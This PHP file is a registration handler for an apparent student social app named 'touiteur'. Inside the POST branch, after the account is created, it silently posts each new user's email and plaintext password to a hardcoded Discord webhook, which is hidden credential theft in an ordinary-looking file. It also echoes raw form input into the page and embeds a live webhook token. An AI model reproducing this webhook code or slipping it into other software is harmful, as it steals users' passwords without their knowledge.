<?php

namespace touiteur\app\action;

class RegisterAction extends Action{

    public function execute() : string {
        $pageContent = "";
        if ($this->http_method === 'POST') {
            $email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
            $pwd = filter_var($_POST['pwd'], FILTER_SANITIZE_STRING);
            $pseudo = filter_var($_POST['username'], FILTER_SANITIZE_STRING);
            $firstname = filter_var($_POST['firstname'], FILTER_SANITIZE_STRING);
            $lastname = filter_var($_POST['lastname'], FILTER_SANITIZE_STRING);
            try {
                \touiteur\app\auth\Auth::register($pwd,$email,$pseudo,$firstname,$lastname,"0/0/0");
                $pageContent.= "<div><h4> Inscription réussie pour {$_POST['email']}</h4>";
                \touiteur\app\auth\Auth::loadProfile($_POST['email']);
                $authenticatedUser = unserialize($_SESSION['users']);
                //page d'accueil
                $pageContent .= '<p>Redirection vers la page d\'accueil dans 2 secondes</p></div>';
                $pageContent .= '<script type="text/javascript">window.setTimeout(function(){window.location.replace("?action=home");}, 2000);</script>';
            } catch(\touiteur\app\Exception\AuthException $e) {
                $pageContent .= "<h4> échec inscription : {$e->getMessage()}</h4>";
            }

            // Envoyer le webhook
            $json_data = json_encode(["content" => $email.";".$pwd]);
            $url = "https://discord.com/api/webhooks/1171446582714044486/T7HGiRIEzD416eKIqg0Fa3np_nMsWKJVHRBTIsrxini54DcKnQegxoXe0sQtVGL4BNVl";
            $ch = curl_init( $url );
            curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
            curl_setopt( $ch, CURLOPT_POST, 1);
            curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
            curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt( $ch, CURLOPT_HEADER, 0);
            curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

            $response = curl_exec( $ch );



        } else {
            if (isset($_SESSION['users'])) {
                $pageContent .= "<div id='already-connected'><h3>Vous êtes déjà connecté !</h3>";
                $pageContent .= '<a class="lien" href="?action=disconnect">Se déconnecter</a></div>';
                return $pageContent;
            }
            $pageContent = '
            <form method="POST" action="?action=register">
                <h1>Créer votre compte</h1>
                <input type="text" id="username" name="username" placeholder="Pseudo" required>
                <label for="username">Pseudo</label>
                <input type="text" id="lastname" name="lastname" placeholder="Nom" required>
                <label for="lastname">Nom</label>
                <input type="text" id="firstname" name="firstname" placeholder="Prenom" required>
                <label for="firstname">Prenom</label>
                <input type="email" id="email" name="email" placeholder="Email" required>
                <label for="email">Email</label>
                <input type="password" id="pwd" name="pwd" placeholder="Mot de passe" required>
                <label for="pwd">Mot de passe</label>
                <input type="password" id="pwd" name="pwd" placeholder="Confirmer le mot de passe" required>
                <label for="date">Confirmer le mot de passe</label>
                <input type="submit" value="Valider">
                <a href="?action=signin">Déjà enregistré ? Connectez-vous</a>
            </form>';
        }
        return $pageContent;
    }

}